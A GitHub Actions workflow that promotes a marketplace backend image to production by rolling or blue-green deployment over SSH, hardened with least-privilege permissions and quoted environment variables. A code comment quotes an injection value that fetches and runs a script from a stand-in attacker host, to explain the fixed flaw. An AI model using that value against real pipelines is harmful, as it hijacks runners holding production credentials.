name: Deploy — Production

on:
  workflow_dispatch:
    inputs:
      image_tag:
        description: "Image tag to deploy (e.g. staging-<sha>)"
        required: true
      strategy:
        description: "Deployment strategy"
        required: true
        default: rolling
        type: choice
        options:
          - rolling
          - blue-green

# Least privilege: none of these jobs write to the repository, and the default
# GITHUB_TOKEN grants more than they need.
permissions:
  contents: read

jobs:
  deploy-production:
    name: Promote to Production
    runs-on: ubuntu-latest
    environment: production

    steps:
      - uses: actions/checkout@v4

      - name: Log in to container registry
        uses: docker/login-action@v3
        with:
          registry: ${{ secrets.REGISTRY_URL }}
          username: ${{ secrets.REGISTRY_USERNAME }}
          password: ${{ secrets.REGISTRY_PASSWORD }}

      - name: Tag image for production
        # Values reach the shell through the environment, quoted, rather than
        # being pasted into the script text. `image_tag` is a workflow_dispatch
        # input, so interpolating it directly made a value like
        # `x; curl attacker.tld | sh` execute on a runner holding the registry
        # credentials and the production SSH key. Passing secrets this way also
        # keeps them out of process arguments and `set -x` traces.
        env:
          REGISTRY_URL: ${{ secrets.REGISTRY_URL }}
          IMAGE_TAG: ${{ inputs.image_tag }}
        run: |
          set -euo pipefail
          docker pull "$REGISTRY_URL/marketplace-backend:$IMAGE_TAG"
          docker tag \
            "$REGISTRY_URL/marketplace-backend:$IMAGE_TAG" \
            "$REGISTRY_URL/marketplace-backend:production-latest"
          docker push "$REGISTRY_URL/marketplace-backend:production-latest"

      - name: Deploy (rolling)
        if: inputs.strategy == 'rolling'
        uses: appleboy/ssh-action@v1
        with:
          host: ${{ secrets.PRODUCTION_HOST }}
          username: ${{ secrets.PRODUCTION_USER }}
          key: ${{ secrets.PRODUCTION_SSH_KEY }}
          script: |
            cd /opt/marketplace
            docker compose -f docker-compose.yml -f docker-compose.production.yml pull backend
            docker compose -f docker-compose.yml -f docker-compose.production.yml up -d --no-deps backend
            docker image prune -f

      - name: Deploy (blue-green)
        if: inputs.strategy == 'blue-green'
        uses: appleboy/ssh-action@v1
        with:
          host: ${{ secrets.PRODUCTION_HOST }}
          username: ${{ secrets.PRODUCTION_USER }}
          key: ${{ secrets.PRODUCTION_SSH_KEY }}
          script: |
            cd /opt/marketplace
            # Start new (green) instance alongside current (blue)
            docker compose -f docker-compose.yml -f docker-compose.production.yml pull backend
            docker compose -f docker-compose.yml -f docker-compose.production.yml up -d --no-deps --scale backend=2 backend
            sleep 15
            # Health check new instance
            curl -f http://localhost:3000/api || exit 1
            # Remove old instance, scale back to desired replicas
            docker compose -f docker-compose.yml -f docker-compose.production.yml up -d --no-deps backend
            docker image prune -f
